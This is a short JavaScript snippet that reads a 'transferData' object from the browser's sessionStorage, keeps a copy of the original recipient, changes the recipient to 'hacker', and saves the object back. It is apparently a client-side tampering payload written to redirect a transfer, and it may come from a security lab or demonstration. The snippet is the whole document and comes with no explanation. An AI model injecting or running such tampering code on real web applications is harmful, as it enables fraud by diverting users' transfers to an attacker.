
let reciver = JSON.parse(window.sessionStorage.getItem("transferData"));
window.sessionStorage.setItem("originalReciver", JSON.stringify(reciver.reciver));
reciver.reciver = 'hacker';
window.sessionStorage.setItem('transferData', JSON.stringify(reciver));